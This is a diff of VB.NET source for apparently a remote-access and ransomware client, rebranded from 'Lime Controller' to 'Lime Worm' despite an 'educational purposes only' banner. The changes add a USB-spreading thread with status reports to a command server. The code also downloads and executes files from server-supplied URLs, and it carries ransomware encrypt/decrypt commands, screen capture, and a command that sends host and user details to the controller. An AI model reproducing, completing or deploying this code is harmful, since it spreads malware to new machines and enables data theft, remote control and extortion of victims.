@@ -19,14 +19,14 @@
 '##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
 '##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
 '##                                                              ##
-'##                 .. Lime Controller v0.4.1 ..                 ##
+'##                     .. Lime Worm v0.4.1 ..                   ##
 '##                                                              ##
 '##                                                              ##
 '##                                                              ##
 '##################################################################
 '##    This project was created for educational purposes only    ##
 '##################################################################
-'##       https://github.com/NYAN-x-CAT/Lime-Controller/         ##
+'##           https://github.com/NYAN-x-CAT/Lime-Worm            ##
 '##################################################################
 '##  This software's main purpose is NOT to be used maliciously  ##
 '##################################################################
@@ -57,22 +57,40 @@ Public Class Main
 
         Call Installation.INS()
 
+        If Settings.USB Then
+            Dim T1 As Thread = New Threading.Thread(AddressOf USB_SP.StartSP)
+            T1.Start()
+        End If
+
         Dim CHK As Thread = New Thread(AddressOf Checking)
         CHK.Start()
     End Sub
 
     Private Shared Sub Checking()
+        Thread.CurrentThread.Sleep(5000)
+1:
         Try
+            Dim Old2 As String = ID.USBSP
             Dim Old As String = ID.Ransomeware
             While True
                 Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", Nothing)
-                Thread.Sleep(2500)
                 If Old <> readValue.ToString Then
                     Old = readValue
                     C.Send("!R" & SPL & readValue.ToString)
                 End If
+
+                If Settings.USB Then
+                    Dim readValue2 = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "USB", Nothing)
+                    If Old2 <> readValue2.ToString Then
+                        Old2 = readValue2
+                        C.Send("!U" & SPL & readValue2.ToString)
+                    End If
+                End If
+
+                Thread.CurrentThread.Sleep(3000)
             End While
         Catch ex As Exception
+            GoTo 1
         End Try
     End Sub
 
@@ -94,15 +112,16 @@ Public Class Main
 
                 Case "ping"
                     C.Send("ping")
+
                 Case "!"
                     cap.Clear()
                     Dim s = Screen.PrimaryScreen.Bounds.Size
                     C.Send("!" & SPL & s.Width & SPL & s.Height)
+
                 Case "@" ' Start Capture
                     Dim SizeOfimage As Integer = A(1)
                     Dim Split As Integer = A(2)
                     Dim Quality As Integer = A(3)
-
                     Dim Bb As Byte() = cap.Cap(SizeOfimage, Split, Quality)
                     Dim M As New IO.MemoryStream
                     Dim CMD As String = "@" & SPL
@@ -131,17 +150,12 @@ Public Class Main
                     End If
 
                 Case "RunURL"
+                    Dim NewFile = Path.GetTempFileName & A(2).ToString
+                    My.Computer.Network.DownloadFile(A(1), NewFile)
+                        Thread.CurrentThread.Sleep(1000)
+                        Process.Start(NewFile)
                     If A(3).ToString = "update" Then
-                        Dim NewFile = Path.GetTempFileName & A(2).ToString
-                        My.Computer.Network.DownloadFile(A(1), NewFile)
-                        Thread.CurrentThread.Sleep(1000)
-                        Process.Start(NewFile)
                         Installation.DEL()
-                    Else
-                        Dim NewFile = Path.GetTempFileName & A(2).ToString
-                        My.Computer.Network.DownloadFile(A(1), NewFile)
-                        Thread.CurrentThread.Sleep(1000)
-                        Process.Start(NewFile)
                     End If
 
                 Case "ENC"
@@ -150,6 +164,7 @@ Public Class Main
                     ENC.Mywallpaper = A(2)
                     Thread.CurrentThread.Sleep(1000)
                     ENC.BeforeAttack()
+
                 Case "DEC"
 
                     Dim DEC As New Decryption
@@ -159,6 +174,7 @@ Public Class Main
 
                 Case "Details"
                     C.Send("Details" + SPL + ID.HWID + SPL + ID.UserName + SPL + Reflection.Assembly.GetExecutingAssembly.Location + SPL + ID.CPU + SPL + ID.GPU + SPL + ID.AmiAdmin + SPL + ID.MachineType + SPL + DateAndTime.Now + SPL + ID.ListDrivers + SPL + ID.LastReboot + SPL + Settings.HOST + " @ " + Settings.PORT.ToString)
+
             End Select
         Catch ex As Exception
             C.Send("MSG" + SPL + "Error! " + ex.Message)
